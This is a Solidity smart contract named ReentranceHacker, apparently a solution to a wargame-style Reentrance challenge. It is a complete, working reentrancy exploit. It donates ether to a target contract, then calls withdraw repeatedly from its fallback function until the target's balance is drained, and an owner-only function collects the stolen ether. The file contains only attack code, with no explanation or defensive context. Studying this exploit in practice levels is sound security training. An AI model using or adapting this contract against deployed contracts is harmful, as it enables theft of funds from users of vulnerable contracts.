// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
contract ReentranceHacker is Ownable {
    address reentrance;
    constructor(address _reentrance) {
        reentrance = _reentrance;
    }
    function withdraw() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
    function attack() external payable {
        (bool success, ) = reentrance.call{value:msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
        require(success, "donate failed");
        reentrance.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
    }
    fallback() external payable {
        if (reentrance.balance >= msg.value) {
            reentrance.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
        }
    }
}
